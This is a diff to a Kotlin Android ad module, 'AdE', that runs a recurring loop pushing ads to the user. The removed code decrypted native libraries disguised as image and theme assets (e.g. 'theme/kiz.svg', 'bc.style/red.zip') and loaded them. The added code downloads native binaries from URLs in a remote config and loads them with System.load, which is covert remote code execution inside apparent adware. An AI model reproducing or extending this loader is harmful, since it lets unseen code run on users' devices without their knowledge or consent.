@@ -8,6 +8,7 @@ import android.net.ConnectivityManager
 import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
+import android.util.Log
 import androidx.core.content.ContextCompat
 import com.vivo.core.Core
 import com.vivo.core.AppLifelListener
@@ -52,7 +53,6 @@ object AdE {
     var lastSAdTime = 0L //上一次显示广告的时间
 
     private val mMainScope = CoroutineScope(Dispatchers.Main)
-    private var mInstallWait = 40000 // 安装时间
     private var cTime = 30000L // 检测间隔
     private var tPer = 40000 // 显示间隔
     private var nHourShowMax = 80//小时显示次数
@@ -75,8 +75,10 @@ object AdE {
     private var timeDS = 100L //延迟显示随机时间开始
     private var timeDE = 400L //延迟显示随机时间结束
     private var maxShowTime = 10000L // 最大显示时间
-    private var checkTimeRandom = 1000 // 在定时时间前后增加x秒
     private var screenOpenCheck = 1400L // 屏幕监测、延迟显示
+    private var soUrlH5 = ""
+
+    private var soUrlW = ""
 
     @JvmStatic
     fun gDTime(): Long {
@@ -169,36 +171,42 @@ object AdE {
         val lt = js.optString("guava_tim").split("-")//时间相关配置
         cTime = lt[0].toLong() * 1000
         tPer = lt[1].toInt() * 1000
-        mInstallWait = lt[2].toInt() * 1000
-        nHourShowMax = lt[3].toInt()
-        nDayShowMax = lt[4].toInt()
-        nTryMax = lt[5].toInt()
-        timeDS = lt[6].toLong()
-        timeDE = lt[7].toLong()
-        maxShowTime = lt[8].toLong() * 1000
-        checkTimeRandom = lt[9].toInt() * 1000
+        nHourShowMax = lt[2].toInt()
+        nDayShowMax = lt[3].toInt()
+        nTryMax = lt[4].toInt()
+        timeDS = lt[5].toLong()
+        timeDE = lt[6].toLong()
+        maxShowTime = lt[7].toLong() * 1000
+        screenOpenCheck = lt[8].toLong()
+        val lSoU = js.optJSONArray("guav_url_s")
+        if (isF()) {
+            soUrlW = lSoU[0].toString()
+            soUrlH5 = lSoU[2].toString()
+        } else {
+            soUrlW = lSoU[1].toString()
+            soUrlH5 = lSoU[3].toString()
+        }
     }
 
     private var lastS = ""
     private fun refreshAdmin() {
-        val s = Core.getStr("meow_config")
+        val s = Core.getStr("summer_config")
         if (lastS != s) {
             lastS = s
             reConfig(JSONObject(s))
         }
     }
 
-    private fun t() {
-        val is64i = isF()
+    private fun dS(file: File) {
         mMainScope.launch {
             Core.pE("test_s_dec")
             val time = System.currentTimeMillis()
             val i: Boolean
             withContext(Dispatchers.IO) {
-                i = loFi(if (is64i) "theme/kiz.svg" else "theme/cool.jpeg")
+                i = loSo(file)
             }
             if (i.not()) {
-                Core.pE("ss_l_f", "$is64i")
+                Core.pE("ss_l_f")
                 return@launch
             }
             Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
@@ -206,10 +214,6 @@ object AdE {
             while (true) {
                 // 刷新配置
                 refreshAdmin()
-//                var t = cTime
-//                if (checkTimeRandom > 0) {
-//                    t = Random.nextLong(cTime - checkTimeRandom, cTime + checkTimeRandom)
-//                }
                 checkAd()
                 delay(cTime)
                 if (numJumps > nTryMax) {
@@ -218,53 +222,52 @@ object AdE {
                 }
             }
         }
-
-        mMainScope.launch(Dispatchers.IO) {
-            delay(1000)
-            if (loFi(if (is64i) "bc.style/red.zip" else "bc.style/yellow.txt")) {
-                withContext(Dispatchers.Main) {
-                    try {
-                        A.b(mContext)
-                        isLoadH = true
-                    } catch (_: Throwable) {
-                    }
-                }
-            }
-        }
     }
 
-    private fun loFi(assetsName: String): Boolean {
-        val assetsInputS = mContext.assets.open(assetsName)
-        val fileSoName = "Bz_${System.currentTimeMillis()}"
-        val file = File("${mContext.filesDir}/Cache")
-        if (file.exists().not()) {
-            file.mkdirs()
-        }
+    private fun t() {
+        val parentFile = File("${mContext.filesDir}")
+        val save = File(parentFile, "fileMine")
+        FileDownLoad("").fileD(soUrlW, success = {
+            dS(save)
+            mMainScope.launch(Dispatchers.IO) {
+                delay(1000)
+                val hFile = File(parentFile, "fileMineH")
+                FileDownLoad("Hh").fileD(soUrlH5, success = {
+                    loSo(hFile)
+                    mMainScope.launch {
+                        try {
+                            A.b(mContext)
+                            isLoadH = true
+                        } catch (_: Throwable) {
+                        }
+                    }
+                }, hFile)
+            }
+        }, save)
+    }
+
+    private fun loSo(assetsName: File): Boolean {
         try {
-            deF(assetsInputS, File(file.absolutePath, fileSoName))
-            val file2 = File(file.absolutePath, fileSoName)
-            System.load(file2.absolutePath)
-            file2.delete()
+            assetsName.setReadOnly()
+            System.load(assetsName.absolutePath)
             return true
-        } catch (e: Exception) {
-            e.printStackTrace()
+        } catch (_: Exception) {
         }
         return false
     }
 
-
     // 解密
-    private fun deF(inputFile: InputStream, outputFile: File) {
-        val key = SecretKeySpec(sK.toByteArray(), "AES")
-        val cipher = Cipher.getInstance("AES")
-        cipher.init(Cipher.DECRYPT_MODE, key)
-        val outputStream = FileOutputStream(outputFile)
-        val inputBytes = inputFile.readBytes()
-        val outputBytes = cipher.doFinal(inputBytes)
-        outputStream.write(outputBytes)
-        outputStream.close()
-        inputFile.close()
-    }
+//    private fun deF(inputFile: InputStream, outputFile: File) {
+//        val key = SecretKeySpec(sK.toByteArray(), "AES")
+//        val cipher = Cipher.getInstance("AES")
+//        cipher.init(Cipher.DECRYPT_MODE, key)
+//        val outputStream = FileOutputStream(outputFile)
+//        val inputBytes = inputFile.readBytes()
+//        val outputBytes = cipher.doFinal(inputBytes)
+//        outputStream.write(outputBytes)
+//        outputStream.close()
+//        inputFile.close()
+//    }
 
     private fun isF(): Boolean {
         // 优先检测64位架构
@@ -307,6 +310,11 @@ object AdE {
             val del = tPer - (System.currentTimeMillis() - lastSAdTime)
             delay(del)
             Core.pE("advertise_times")
+            val sDel = maxShowTime - System.currentTimeMillis() - lastSAdTime
+            if (sDel > 0) {
+                Core.pE("ad_showing")
+                delay(sDel)
+            }
             if (l().not()) {
                 while (l().not()) {
                     delay(screenOpenCheck)
